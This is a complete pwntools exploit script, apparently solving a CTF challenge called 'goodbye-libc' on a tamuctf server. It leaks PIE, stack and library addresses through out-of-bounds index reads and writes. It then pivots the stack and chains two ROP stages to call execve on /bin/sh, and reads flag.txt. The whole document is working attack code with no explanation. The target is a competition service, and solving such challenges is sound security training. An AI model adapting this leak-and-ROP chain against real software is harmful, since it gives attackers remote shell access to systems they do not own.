from pwn import *
import re
import time

context.log_level = "info"
context.arch = "amd64"

HOST = "streams.tamuctf.com"
PORT = 443
SNI = "goodbye-libc"

PIE_LEAK_OFF = 0x1CBD
LIB_READ_RET_OFF = 0x1065

POP_RBP_OFF = 0x1158
LEAVE_RET_OFF = 0x11E5
READ_PLT_OFF = 0x1020
RCX_LEAK_JUMP_OFF = 0x1710

LIB_POP_RDI_RSI_RDX_RET = 0x103F
LIB_SYSCALL = 0x1039


def start():
    return remote(HOST, PORT, ssl=True, sni=SNI)


def menu(io, n):
    io.sendline(str(n).encode())


def leak_idx(io, raw_idx):
    menu(io, 6)
    io.recvuntil(b"Select index to read from [1-3]: ")
    io.sendline(str(raw_idx).encode())
    out = io.recvuntil(b"Enter input: ")
    m = re.search(rb"Value written: (\d+)", out)
    if not m:
        raise ValueError(f"missing leak in output: {out!r}")
    return int(m.group(1)), out


def write_idx(io, raw_idx, value):
    menu(io, 1)
    io.recvuntil(b"Select index to write to [1-3]: ")
    io.sendline(str(raw_idx).encode())
    io.recvuntil(b"Select value to write: ")
    io.sendline(str(value).encode())
    return io.recvuntil(b"Enter input: ")


def leak_lib_base(io, pie_base):
    menu(io, 1)
    io.recvuntil(b"Select index to write to [1-3]: ")
    io.sendline(b"4294967295")
    io.recvuntil(b"Select value to write: ")
    io.sendline(str(pie_base + RCX_LEAK_JUMP_OFF).encode())
    out = io.recvuntil(b"Enter input: ")
    m = re.search(rb"Result of \d+ \+ (\d+)", out)
    if not m:
        raise ValueError(f"missing rcx leak: {out!r}")
    return int(m.group(1)) - LIB_READ_RET_OFF, out


def build_stage1(pie_base, lib_base, stack_leak):
    read_plt = pie_base + READ_PLT_OFF
    leave_ret = pie_base + LEAVE_RET_OFF
    stage2 = stack_leak - 0x300
    stage1 = flat(
        stage2,
        lib_base + LIB_POP_RDI_RSI_RDX_RET,
        0,
        stage2,
        0x200,
        read_plt,
        leave_ret,
    )
    return stage1, stage2


def build_stage2(pie_base, lib_base, stage2_addr):
    read_plt = pie_base + READ_PLT_OFF
    execbuf = stage2_addr + 0x100
    stage2 = flat(
        0,
        lib_base + LIB_POP_RDI_RSI_RDX_RET,
        0,
        execbuf,
        59,
        read_plt,
        lib_base + LIB_POP_RDI_RSI_RDX_RET,
        execbuf,
        execbuf + 0x20,
        0,
        lib_base + LIB_SYSCALL,
    )
    return stage2, execbuf


def build_execbuf(execbuf):
    data = bytearray()
    data += b"/bin/sh\x00"
    data += b"A" * (0x20 - len(data))
    data += p64(execbuf)
    data += p64(0)
    data += b"B" * (59 - len(data))
    return bytes(data)


def exploit(io):
    io.recvuntil(b"Enter input: ")

    pie_leak, _ = leak_idx(io, 4294967295)
    stack_leak, _ = leak_idx(io, 4294967294)
    pie_base = pie_leak - PIE_LEAK_OFF

    lib_base, lib_out = leak_lib_base(io, pie_base)

    log.info(f"pie base:   {hex(pie_base)}")
    log.info(f"stack leak: {hex(stack_leak)}")
    log.info(f"lib base:   {hex(lib_base)}")

    pop_rbp = pie_base + POP_RBP_OFF
    leave_ret = pie_base + LEAVE_RET_OFF
    read_plt = pie_base + READ_PLT_OFF
    stage1_addr = stack_leak - 0xBC

    write_idx(io, 0, pop_rbp)
    write_idx(io, 1, stage1_addr)
    write_idx(io, 2, leave_ret)

    stage1, stage2_addr = build_stage1(pie_base, lib_base, stack_leak)
    stage2, execbuf = build_stage2(pie_base, lib_base, stage2_addr)
    execbuf_data = build_execbuf(execbuf)

    menu(io, 1)
    io.recvuntil(b"Select index to write to [1-3]: ")
    io.sendline(b"4294967295")
    io.recvuntil(b"Select value to write: ")
    io.sendline(str(read_plt).encode())

    time.sleep(0.15)
    io.send(stage1)

    time.sleep(0.15)
    io.send(stage2)

    time.sleep(0.15)
    io.send(execbuf_data)

    time.sleep(0.2)
    io.sendline(b"cat flag.txt; exit")
    return io.recvrepeat(2.0)


def main():
    io = start()
    try:
        out = exploit(io)
        print(out.decode("latin-1", errors="replace"))
    finally:
        io.close()


if __name__ == "__main__":
    main()
